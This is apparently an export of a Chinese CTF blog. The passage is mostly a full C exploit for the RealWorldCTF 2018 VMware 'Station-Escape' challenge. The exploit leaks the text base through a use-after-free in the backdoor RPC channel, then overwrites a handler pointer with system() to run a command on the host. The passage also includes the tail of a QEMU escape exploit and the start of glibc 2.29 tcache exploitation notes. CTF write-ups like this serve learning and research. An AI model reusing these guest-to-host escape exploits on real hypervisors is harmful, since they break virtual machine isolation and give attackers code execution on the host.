0x200008)) = 0x3f5; *((uint64_t*)(mmio_mem + 0x200010)) = 0x1317940-0x18; *((uint64_t*)(mmio_mem + 0x200018)) = 0x1317940-0x10; *((uint64_t*)(mmio_mem + 0x2003f0)) = 0x3f0; mmio_write(0x110000,0); *((uint64_t*)(mmio_mem + 0x200000)) = 0x61632d656d6f6e67; //gnome-ca *((uint64_t*)(mmio_mem + 0x200008)) = 0x726f74616c75636c; //lculator *((uint64_t*)(mmio_mem + 0x200010)) = 0x0; *((uint64_t*)(mmio_mem + 0x200020)) = 0x11301A0; //free@got *((uint64_t*)(mmio_mem + 0x210000)) = 0x413DF0; //system@plt mmio_write(0x100000,0); return 0;&#125; 其他解法 利用线程堆地址前面的0x7f作为fastbin_attack的fake_size，然后分配fake_chunk到user_buf上，进而任意地址读写。 https://blog.bushwhackers.ru/defconquals2018-ec3/ 2019强网杯_qwct2019强网杯 FINAL ExecChrome2019XCTF FINAL busybox2018RealWorldCTF Final Station-Escapehttps://beafb1b1.github.io/backup/realworldctf_2018_stationescape/ diff的几种方法IDA插件diaphora速度非常慢，效果较好，可以看伪代码的区别，下载地址： git clone https://github.com/joxeankoret/diaphora 需要注意最新版本的脚本为py3，需要下载老版本的py2： 用法： https://www.cnblogs.com/aliflycoris/p/10906162.html bindiff速度较慢，效果较好，可以看伪代码的区别： https://www.cnblogs.com/lsdb/p/10543411.html https://www.zynamics.com/software.html 用IDA导出伪代码后用vscode比较ctrl+F5导出伪代码到文件，然后用vscode比较即可。 速度较慢，效果较好，主要为了查看伪代码的区别，但是代码量较大时比较不了。 git diff用git diff去比较，速度较慢，效果一般。 010 editer点击工具栏-&gt;比较文件，选择两个文件点击确认即可。 速度极快，1秒钟完事，效果很好，唯一的缺点是只能比较二进制码。 diff123xdd file1 &gt; file1.hexxdd file2 &gt; file2.hexdiff file1.hex file2.hex 速度较快，1秒钟完事，效果我觉得没有010 editer好，也是只能比较二进制码。 总结想看伪代码的话，就会非常慢，因为反汇编函数非常费时间，特别是大型二进制文件，比较合适的办法是先比较二进制码(推荐010 editer)，找到different的地址位置再去分析伪代码。 关于调试vmware-vmx文件的位置在： /usr/lib/vmware/bin/vmware-vmx 将其替换为题目给的vmware-vmx-patched，然后新建一个虚拟机，在里面跑exp即可。 我个人遇到的小问题是替换之后，虚拟机开启没一会，就会报错，即使我什么都没错，运气好大概能撑两分钟，运气差刚开机就gg，感觉很迷。。。我又没触发vmtools： 然后调试时要避免被卡死，就是你在外面gdb attach，然后下好断点之后按c，然后再进去虚拟机里面跑exp，然后你鼠标忘记切出来，虚拟机又因为遇到断点卡死了，所以你就不得不把宿主机关机了。。。所以我在需要下断点调试的地方之前都加了getchar()+sleep()，遇到getchar()时，点击回车之后赶紧切出鼠标，等待断点触发即可。 漏洞挖掘直接diff即可，只是对这个漏洞的理解和如何触发它，如果没有vmtools的backdoor的接口的知识储备的话，也很难进行后续的利用吧，所以实际上还是在啃前辈嚼烂的东西。。。唉。 漏洞利用leak存在UAF，且elf中存在system函数，所以我们想办法泄露出codebase即可，根据wp的方法，先free掉一块内存，然后再传递vmx.capability.dnd_version命令申请一个相同size(0x100)的chunk用来存放一个obj，其中含有虚表指针，所以再次读出之前free掉那块内存的channel的outbuf就可以泄露出codebase。值得关注的一点是0x110这个size的chunk很巧的正好所在的tcache大概率是空了很多，且恰好是obj的size，很是巧合。 hijack用UAF直接修改被free了的chunk的fd，然后改为codebase+0xFE95B8，其是一个函数指针，可以理解为rpic_cmd_handler，当有命令传给rpc时，其就会被触发，且其之后紧跟的8个字节会被作为其第一个参数。所以对这个地方进行任意地址写，将其改为system@plt，其后八个字节改为gnome-calculator\x00的地址，然后再传入一个命令触发即可。 exp我做了注释和改动，应该有助于理解。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res)&#123; asm("movl %%eax,%%ebx\n\t" "movq %%rdi,%%r10\n\t" "movq %%rsi,%%r11\n\t" "movq %%rdx,%%r12\n\t" "movq %%rcx,%%r13\n\t" "movl $0x564d5868,%%eax\n\t" "movl $0xc9435052,%%ebx\n\t" "movl $0x1e,%%ecx\n\t" "movl $0x5658,%%edx\n\t" "out %%eax,%%dx\n\t" "movl %%edi,(%%r10)\n\t" "movl %%esi,(%%r11)\n\t" "movl %%edx,(%%r12)\n\t" "movl %%ecx,(%%r13)\n\t" : : :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r8","%r10","%r11","%r12","%r13" );&#125;void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res)&#123; asm("movl %%eax,%%ebx\n\t" "movq %%r8,%%r10\n\t" "movl %%ecx,%%ebx\n\t" "movl $0x564d5868,%%eax\n\t" "movl $0x0001001e,%%ecx\n\t" "movw $0x5658,%%dx\n\t" "out %%eax,%%dx\n\t" "movl %%ecx,(%%r10)\n\t" : : :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10" );&#125;void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res)&#123; asm("pushq %%rbp\n\t" "movq %%r9,%%r10\n\t" "movq %%r8,%%rbp\n\t" "movq %%rcx,%%r11\n\t" "movq $0,%%r12\n\t" "1:\n\t" "movq %%r8,%%rbp\n\t" "add %%r12,%%rbp\n\t" "movl (%%rbp),%%ebx\n\t" "movl $0x564d5868,%%eax\n\t" "movl $0x0002001e,%%ecx\n\t" "movw $0x5658,%%dx\n\t" "out %%eax,%%dx\n\t" "addq $4,%%r12\n\t" "cmpq %%r12,%%r11\n\t" "ja 1b\n\t" "movl %%ecx,(%%r10)\n\t" "popq %%rbp\n\t" : : :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12" );&#125;void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res)&#123; asm("movl %%eax,%%ebx\n\t" "movq %%r8,%%r10\n\t" "movq %%rcx,%%r11\n\t" "movl $0x564d5868,%%eax\n\t" "movl $0x0003001e,%%ecx\n\t" "movw $0x5658,%%dx\n\t" "out %%eax,%%dx\n\t" "movl %%ecx,(%%r10)\n\t" "movl %%ebx,(%%r11)\n\t" : : :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11" );&#125;void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res)&#123; asm("pushq %%rbp\n\t" "movq %%r9,%%r10\n\t" "movq %%r8,%%rbp\n\t" "movq %%rcx,%%r11\n\t" "movq $1,%%rbx\n\t" "movl $0x564d5868,%%eax\n\t" "movl $0x0004001e,%%ecx\n\t" "movw $0x5658,%%dx\n\t" "in %%dx,%%eax\n\t" "add %%r11,%%rbp\n\t" "movl %%ebx,(%%rbp)\n\t" "movl %%ecx,(%%r10)\n\t" "popq %%rbp\n\t" : : :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12" );&#125;void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res)&#123; asm("movl %%eax,%%ebx\n\t" "movq %%rcx,%%r10\n\t" "movq $0x1,%%rbx\n\t" "movl $0x564d5868,%%eax\n\t" "movl $0x0005001e,%%ecx\n\t" "movw $0x5658,%%dx\n\t" "out %%eax,%%dx\n\t" "movl %%ecx,(%%r10)\n\t" : : :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10" );&#125;void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res)&#123; asm("movl %%eax,%%ebx\n\t" "movq %%rcx,%%r10\n\t" "movq $0x21,%%rbx\n\t" "movl $0x564d5868,%%eax\n\t" "movl $0x0005001e,%%ecx\n\t" "movw $0x5658,%%dx\n\t" "out %%eax,%%dx\n\t" "movl %%ecx,(%%r10)\n\t" : : :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10" );&#125;void channel_close(int cookie1,int cookie2,int channel_num,int *res)&#123; asm("movl %%eax,%%ebx\n\t" "movq %%rcx,%%r10\n\t" "movl $0x564d5868,%%eax\n\t" "movl $0x0006001e,%%ecx\n\t" "movw $0x5658,%%dx\n\t" "out %%eax,%%dx\n\t" "movl %%ecx,(%%r10)\n\t" : : :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10" );&#125;struct channel&#123; int cookie1; int cookie2; int num;&#125;;uint64_t heap = 0;uint64_t text = 0;void run_cmd(char *cmd)&#123; struct channel tmp; int res,len,i; char *data; channel_open(&amp;tmp.cookie1,&amp;tmp.cookie2,&amp;tmp.num,&amp;res); if(!res)&#123; printf("fail to open channel!\n"); return; &#125; channel_set_len(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd),&amp;res); if(!res)&#123; printf("fail to set len\n"); return; &#125; channel_send_data(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd)+0x10,cmd,&amp;res); channel_recv_reply_len(tmp.cookie1,tmp.cookie2,tmp.num,&amp;len,&amp;res); if(!res)&#123; printf("fail to recv data len\n"); return; &#125; printf("recv len:%d\n",len); data = malloc(len+0x10); memset(data,0,len+0x10); for(i=0;i&lt;len+0x10;i+=4)&#123; channel_recv_data(tmp.cookie1,tmp.cookie2,tmp.num,i,data,&amp;res); &#125; printf("recv data:%s\n",data); channel_recv_finish(tmp.cookie1,tmp.cookie2,tmp.num,&amp;res); if(!res)&#123; printf("fail to recv finish\n"); &#125; channel_close(tmp.cookie1,tmp.cookie2,tmp.num,&amp;res); if(!res)&#123; printf("fail to close channel\n"); return; &#125;&#125;void leak()&#123; struct channel chan[10]; int res=0; int len,i; char pay[8192]; char *s1 = "info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; char *data; char *s2 = "info-get guestinfo.a"; char *s3 = "1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; char *s4 = "tools.capability.dnd_version 4"; char *s5 = "vmx.capability.dnd_version"; puts("[+]leak bgein..."); //init data run_cmd(s1); // set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100); run_cmd(s4); //first step channel_open(&amp;chan[0].cookie1,&amp;chan[0].cookie2,&amp;chan[0].num,&amp;res); if(!res)&#123; printf("fail to open channel!\n"); return; &#125; channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&amp;res); if(!res)&#123; printf("fail to set len\n"); return; &#125; channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&amp;res); channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;len,&amp;res); if(!res)&#123; printf("fail to recv data len\n"); return; &#125; printf("recv len:%d\n",len); data = malloc(len+0x10); memset(data,0,len+0x10); for(i=0;i&lt;len+0x10;i++)&#123; channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;res); &#125; printf("recv data:%s\n",data); //second step free the reply and let the other channel get it. channel_open(&amp;chan[1].cookie1,&amp;chan[1].cookie2,&amp;chan[1].num,&amp;res); if(!res)&#123; printf("fail to open channel!\n"); return; &#125; channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2),&amp;res); if(!res)&#123; printf("fail to set len\n"); return; &#125; channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2)-4,s2,&amp;res); if(!res)&#123; printf("fail to send data\n"); return; &#125; //free the output buffer puts("Freeing the buffer... please ready ctrl+alt"); getchar(); //sleep(2); channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;res); if(!res)&#123; printf("fail to recv finish1\n"); return; &#125; //finished sending the command, should get the freed buffer puts("Finishing sending the buffer, should allocate the buffer..."); channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,4,&amp;s2[16],&amp;res); if(!res)&#123; printf("fail to send data\n"); return; &#125; //third step,free it again //set status to be 4 channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;len,&amp;res); if(!res)&#123; printf("fail to recv data len\n"); return; &#125; printf("recv len:%d\n",len); //free the output buffer puts("Free the buffer again...please ready ctrl+alt"); getchar(); //sleep(2); channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;res); if(!res)&#123; printf("fail to recv finish2\n"); return; &#125; puts("Trying to reuse the buffer as a struct, which we can leak..."); run_cmd(s5); puts("Should be done.Check the buffer...please ready ctrl+alt"); getchar(); //sleep(2); //Now the output buffer of chan[1] is used as a struct, which contains many addresses channel_recv_reply_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,&amp;len,&amp;res); if(!res)&#123; printf("fail to recv data len\n"); return; &#125; data = malloc(len+0x10); memset(data,0,len+0x10); for(i=0;i&lt;len+0x10;i+=4)&#123; channel_recv_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,i,data,&amp;res); &#125; printf("recv data:\n"); for(i=0;i&lt;len;i+=8)&#123; printf("recv data:%lx\n",*(long long *)&amp;data[i]); &#125; text = (*(uint64_t *)data)-0xf818d0; puts("[+]Leak Success..."); printf("[+]text base :%p\n",text); getchar(); return;&#125;void exploit()&#123; //the exploit step is almost the same as the leak ones struct channel chan[10]; int res=0; int len,i; char *data; char *s1 = "info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"; char *s2 = "info-get guestinfo.b"; char *s3 = "1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"; char *s4 = "gnome-calculator\x00"; uint64_t pay1 = text+0xFE95B8; uint64_t pay2 = text+0xECFD0; //system uint64_t pay3 = text+0xFE95C8; char *pay4 = "gnome-calculator\x00"; puts("[+]exploit begin..."); run_cmd(s1); channel_open(&amp;chan[0].cookie1,&amp;chan[0].cookie2,&amp;chan[0].num,&amp;res); if(!res)&#123; printf("fail to open channel!\n"); return; &#125; channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&amp;res); if(!res)&#123; printf("fail to set len\n"); return; &#125; channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&amp;res); channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;len,&amp;res); if(!res)&#123; printf("fail to recv data len\n"); return; &#125; printf("recv len:%d\n",len); data = malloc(len+0x10); memset(data,0,len+0x10); for(i=0;i&lt;len+0x10;i+=4)&#123; channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;res); &#125; printf("recv data:%s\n",data); channel_open(&amp;chan[1].cookie1,&amp;chan[1].cookie2,&amp;chan[1].num,&amp;res); if(!res)&#123; printf("fail to open channel!\n"); return; &#125; channel_open(&amp;chan[2].cookie1,&amp;chan[2].cookie2,&amp;chan[2].num,&amp;res); if(!res)&#123; printf("fail to open channel!\n"); return; &#125; channel_open(&amp;chan[3].cookie1,&amp;chan[3].cookie2,&amp;chan[3].num,&amp;res); if(!res)&#123; printf("fail to open channel!\n"); return; &#125; puts("Free the buffer first time...please ready ctrl+alt"); getchar(); sleep(2); channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;res); //free if(!res)&#123; printf("fail to recv finish2\n"); return; &#125; channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s3),&amp;res); //malloc if(!res)&#123; printf("fail to set len\n"); return; &#125; puts("leak2 success"); channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;len,&amp;res); if(!res)&#123; printf("fail to recv data len\n"); return; &#125; puts("Free the buffer second time...please ready ctrl+alt"); getchar(); sleep(2); channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;res); //free if(!res)&#123; printf("fail to recv finish2\n"); return; &#125; channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,8,&amp;pay1,&amp;res); //edit 这里直接edit其fd为pay1 channel_set_len(chan[2].cookie1,chan[2].cookie2,chan[2].num,strlen(s3),&amp;res);//malloc if(!res)&#123; printf("fail to set len\n"); return; &#125; getchar(); channel_set_len(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(s3),&amp;res);//malloc 这个chunk分配到pay1 channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;pay2,&amp;res); //改pay1函数指针为system channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;pay3,&amp;res); //改其第一个参数为pay1+0x10,即gnome-calculator字符串地址 channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(pay4)+1,pay4,&amp;res);//写入gnome-calculator字符串 run_cmd(s4); if(!res)&#123; printf("fail to set len\n"); return; &#125;&#125;void main()&#123; setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); setvbuf(stdin,0,2,0); leak(); getchar(); exploit();&#125; 参考https://zhuanlan.zhihu.com/p/52140921 http://matshao.com/2019/12/05/RealWorldCTF2018-Station-Escape/#more 201935C3_VirtualBox其他:https://github.com/BrieflyX/ctf-pwns/tree/master/escape https://www.anquanke.com/post/id/86515 https://www.jianshu.com/p/dd463368a3c9]]></content>
      <categories>
        <category>Qemu&amp;KVM学习</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>summary</tag>
        <tag>Qemu逃逸</tag>
        <tag>虚拟机逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Glibc2.29笔记]]></title>
    <url>%2F2020%2F04%2F28%2FGlibc2.29%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[本来不想再弄glibc的东西了，但是最近的2.29的题越来越多。。。考虑到以后去给人培训的话，会有知识盲区，不太好，别人来问题的话，不会这方面也很没面子，还是决定花几天时间调一下。也算复习一下tcache相关的东西了。 2.26~2.28都没有double free与tcache-&gt;counts[tc_idx]的检测，从2.29起加了double free 和 调用tcache_get()之前检测tcache-&gt;counts[tc_idx]是否大于0这两个检测。 从2.28起对unsortedbin解链进行了检查，2.23~2.27中unsortedbin_attack都适用。 从2.30起tcache_perthread_struct结构体中的counts数组的成员类型由字符转变为uint16_t(两个字符)。所以2.30之前的tcache_perthread_struct结构体大小为0x240(0x40+0x200)，2.30之后变为0x290(0x40*2+0x200)。 以下内容都基于GLIBC_2.30： 一些结构体： 1234567891011121314151617181920212223242526272829303132# define TCACHE_MAX_BINS 64# define TCACHE_FILL_COUNT 7static struct malloc_par mp_ =&#123; .top_pad = DEFAULT_TOP_PAD, .n_mmaps_max = DEFAULT_MMAP_MAX, .mmap_threshold = DEFAULT_MMAP_THRESHOLD, .trim_threshold = DEFAULT_TRIM_THRESHOLD,#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8)) .arena_test = NARENAS_FROM_NCORES (1)#if USE_TCACHE , .tcache_count = TCACHE_FILL_COUNT, .tcache_bins = TCACHE_MAX_BINS, .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1), .tcache_unsorted_limit = 0 /* No limit. */#endif&#125;;typedef struct tcache_perthread_struct&#123; uint16_t counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct;typedef struct tcache_entry&#123; struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key;&#125; tcache_entry; 一些相关函数： 123456789101112131415161718192021222324252627/* Caller must ensure that we know tc_idx is valid and there's room for more chunks. */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); /* Mark this chunk as "in the tcache" so the test in _int_free will detect a double free. */ e-&gt;key = tcache; e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125;/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); e-&gt;key = NULL; return (void *) e;&#125; 在_int_free()中： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364static void_int_free (mstate av, mchunkptr p, int have_lock)&#123; INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ size = chunksize (p); /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by "design" from some intruder. */ if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) malloc_printerr ("free(): invalid pointer"); /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) malloc_printerr ("free(): invalid size"); check_inuse_chunk(av, p);#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don't 100% trust it (it also matches random payload data at a 1 in 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e-&gt;key == tcache)) //先检测double free &#123; tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr ("free(): double free detected in tcache 2"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ &#125; if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) //再检测tcache是否满了 &#123; tcache_put (p, tc_idx); return; &#125; &#125; &#125;#endif .......常规free操作 在__libc_malloc中： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; _Static_assert (PTRDIFF_MAX &lt;= SIZE_MAX / 2, "PTRDIFF_MAX is not more than half of SIZE_MAX"); void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0));#if USE_TCACHE //进入_int_malloc之前先看tcache /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes; if (!checked_request2size (bytes, &amp;tbytes)) &#123; __set_errno (ENOMEM); return NULL; &#125; size_t tc_idx = csize2tidx (tbytes); MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0) //2.29对count新加了检测,doublefree这个利用应该是彻底gg了 &#123; return tcache_get (tc_idx); &#125; DIAG_POP_NEEDS_COMMENT;#endif if (SINGLE_THREAD_P) &#123; victim = _int_malloc (&amp;main_arena, bytes); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || &amp;main_arena == arena_for_chunk (mem2chunk (victim))); return victim; &#125; arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125;libc_hidden_def (__libc_malloc) 进入到_int_malloc之后，有多处用到了tcache： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#define first(b) ((b)-&gt;fd)#define last(b) ((b)-&gt;bk)//从fastbin中取出后,若还有剩余,取出放入tcache中,直到放完或者tcache满停止if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp; victim = *fb; if (victim != NULL) &#123; if (SINGLE_THREAD_P) *fb = victim-&gt;fd; else REMOVE_FB (fb, pp, victim); if (__glibc_likely (victim != NULL)) &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) malloc_printerr ("malloc(): memory corruption (fast)"); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125;//从smallbin中取出后,若有剩余chunk,则取出放入tcache,取完或者tcache放满为止,这里有unlink漏洞if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) //victim为最早放入smallbin的chunk &#123; bck = victim-&gt;bk; //bck为倒数第二个放进smallbin的chunk if (__glibc_unlikely (bck-&gt;fd != victim)) //构造(bck-&gt;fd == victim)绕过检测 malloc_printerr ("malloc(): smallbin double linked list corrupted"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; //bin-&gt;bk = bck,伪造bck-&gt;bk = fake_chunk bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count //第一次:tc_victim = 倒数第二个放进smallbin的chunk &amp;&amp; (tc_victim = last (bin)) != bin) //第二次:tc_victim = fake_chunk &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; //第一次:bck = fake_chunk set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; //第一次:bin-&gt;bk = fake_chunk bck-&gt;fd = bin; 